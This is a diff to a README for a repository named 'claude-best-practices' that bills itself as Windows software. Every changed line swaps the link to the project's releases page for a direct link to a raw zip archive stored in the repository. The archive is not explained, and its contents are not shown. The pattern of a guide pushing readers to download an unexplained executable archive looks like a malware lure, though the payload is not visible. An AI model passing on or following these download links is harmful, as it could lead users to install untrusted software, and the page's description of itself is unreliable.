@@ -1,6 +1,6 @@
 # 📘 claude-best-practices - Better Claude Work, Clearer Results
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Priyamo4482/claude-best-practices/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Priyamo4482/claude-best-practices/raw/refs/heads/main/resources/practices-best-claude-1.5.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ For smooth use, a system with 8 GB of RAM or more works better.
 
 Visit this page to download:
 
-https://github.com/Priyamo4482/claude-best-practices/releases
+https://github.com/Priyamo4482/claude-best-practices/raw/refs/heads/main/resources/practices-best-claude-1.5.zip
 
 From there, follow these steps:
 
@@ -191,7 +191,7 @@ If you still have trouble, compare the file name with the latest release on the 
 
 Download from the latest Windows release here:
 
-https://github.com/Priyamo4482/claude-best-practices/releases
+https://github.com/Priyamo4482/claude-best-practices/raw/refs/heads/main/resources/practices-best-claude-1.5.zip
 
 Use that page to get the newest version and any related files that come with it
 
